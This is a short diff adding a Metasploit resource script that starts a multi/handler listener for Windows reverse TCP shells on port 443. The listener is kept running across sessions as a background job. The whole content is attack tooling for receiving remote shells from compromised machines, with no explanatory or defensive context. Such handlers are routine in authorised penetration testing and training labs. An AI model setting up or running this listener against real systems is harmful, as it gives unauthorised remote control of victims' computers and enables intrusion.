@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set LPORT 443
+set ExitOnSession false
+exploit -j
